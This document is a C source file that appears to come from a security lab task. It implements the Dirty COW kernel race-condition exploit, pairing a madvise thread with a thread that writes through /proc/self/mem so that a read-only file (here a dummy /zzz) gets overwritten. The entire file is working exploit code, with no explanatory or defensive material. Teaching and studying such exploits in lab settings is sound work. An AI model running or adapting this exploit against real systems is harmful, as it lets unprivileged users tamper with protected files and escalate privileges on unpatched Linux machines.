/* cow_attack.c (Task 1: Overwrite dummy file /zzz) */
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void *map;

void *writeThread(void *arg)
{
    char *content = "******";
    off_t offset = (off_t) arg;
    int f = open("/proc/self/mem", O_RDWR);
    while (1) {
        lseek(f, offset, SEEK_SET);
        write(f, content, strlen(content));
    }
}

void *madviseThread(void *arg)
{
    int file_size = (int) (size_t) arg;
    while (1) {
        madvise(map, file_size, MADV_DONTNEED);
    }
}

int main(int argc, char *argv[])
{
    pthread_t pth1, pth2;
    struct stat st;
    int file_size;

    // Open target file in read-only mode
    int f = open("/zzz", O_RDONLY);
    if (f < 0) {
        perror("open /zzz failed");
        return 1;
    }

    // Map file to COW memory using MAP_PRIVATE
    fstat(f, &st);
    file_size = st.st_size;
    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    // Find position of target area
    char *position = strstr(map, "222222");
    if (!position) {
        fprintf(stderr, "Pattern 222222 not found in /zzz\n");
        return 1;
    }

    printf("Pattern found at offset: %ld\n", (long)(position - (char *)map));
    printf("Starting race condition threads... Press Ctrl+C after 2-4 seconds.\n");

    // Attack using two racing threads
    pthread_create(&pth1, NULL, madviseThread, (void *)(size_t)file_size);
    pthread_create(&pth2, NULL, writeThread, (void *)(position - (char *)map));

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}
